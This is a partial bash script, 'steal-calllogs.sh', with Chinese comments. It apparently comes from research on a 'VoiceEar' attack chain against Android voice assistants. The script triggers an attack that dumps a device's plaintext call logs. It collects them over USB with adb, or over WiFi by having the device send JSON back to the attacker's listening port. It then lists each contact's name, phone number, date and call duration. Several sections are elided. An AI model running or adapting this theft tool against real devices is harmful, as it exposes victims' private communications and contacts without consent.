#!/bin/bash
# steal-calllogs.sh
# 通过 VoiceEar 攻击链触发通话记录明文窃取
# 支持两种连接方式：
#   1) USB 数据线（默认）：设备写文件到 /sdcard 后 adb pull
#   2) WiFi：设备主动回传 JSON 到攻击者监听端口
#
# 用法:
#   ./steal-calllogs.sh                              # 默认 USB，窃取最近 50 条
#   ./steal-calllogs.sh 100                          # 默认 USB，窃取最近 100 条
#   ./steal-calllogs.sh --wifi 192.168.228.40       # WiFi 模式，窃取最近 50 条
#   ./steal-calllogs.sh --wifi 192.168.228.40 100   # WiFi 模式，窃取最近 100 条
...
LIMIT="${1:-50}"
ACTION_USB="steal_calllogs_file"
ACTION_WIFI="steal_calllogs"
REMOTE_FILE="/sdcard/calllogs_theft_raw.json"

OUTPUT_DIR="/home/ningfive/AndroidStudioProjects/VA-protect-feat-backtrace/VA-protect-feat-backtrace"
OUTPUT_FILE="$OUTPUT_DIR/calllogs_$(date +%Y%m%d_%H%M%S).json"

# ── 检测连接方式 ───────────────────────────────────────────────────────────────
echo "================================================"
echo " VoiceEar - 通话记录明文窃取"
echo " Limit   : $LIMIT"
echo "================================================"
echo "[*] 检测设备连接..."
...
if [ -n "$USB_DEVICE" ] && [ "$FORCE_WIFI" = false ]; then
    ...
    if [ -z "$DEVICE_WIFI_IP" ]; then
        echo "[!] 请指定设备 WiFi IP: ./steal-calllogs.sh --wifi <device_ip> [limit]"
        exit 1
    fi
    ...
    echo "[!] 未检测到设备连接"
    echo "    USB 模式: 连接数据线"
    echo "    WiFi 模式: ./steal-calllogs.sh --wifi <device_ip> [limit]"
    exit 1
fi
...
if [ "$CONNECT_MODE" = "wifi" ]; then
    ...
    echo "[i] 注意：需在 Windows 管理员 PowerShell 中配置好 portproxy 25004 -> WSL2:25004"
...
if command -v jq &>/dev/null; then
    ...
    echo "[+] 成功获取 $COUNT 条通话记录"
    echo ""
    jq -r '.[] | "[\(.date)] \(.type)\t时长: \(.duration)秒\t姓名: \(.name)\t电话: \(.number)"' "$OUTPUT_FILE"
else
